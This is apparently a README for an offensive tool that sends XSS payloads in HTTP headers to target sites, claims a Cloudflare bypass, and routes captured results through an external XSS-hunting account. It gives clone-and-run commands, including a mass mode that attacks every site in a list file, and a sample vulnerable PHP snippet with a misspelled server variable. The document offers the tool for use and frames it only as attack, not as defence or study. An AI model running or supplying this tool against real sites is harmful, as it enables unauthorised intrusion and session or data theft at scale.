### xss.codes-Tool
https://xss.codes Http Header XSS Attacker

### What does this do?

Allows you to send XSS payloads to HTTP Header values (with Cloudflare Bypass)

For use ; You must have an https://xss.codes account!


You can Exploiting The : 

*IP Loggers

*Useragent Loggers

*Webshell Log Panels

*Malware Stealer Panels


### Example Vulnerable PHP code:

```
<?

$sakso = $_SERVER["REMOTE_ADRR"];

echo "ip logged :".$sakso

?>
```

### Usage

1)- Open https://xss.codes/register page and create account (The domain name you will enter while registering is the page reserved for you. From xss.codes eg : xss.codes/s/userdomainname)

2)- Follow this command list ;

```
$ git clone https://github.com/0x00fy/xss.codes-Tool/

$ cd xss.codes-Tool

$ python xss.py -t [TARGET] -u [xsscodes user domainname]
```


### Mass : 

```
python mass.py -l sitelist.txt -u your XSS.CODES User Domainname
```
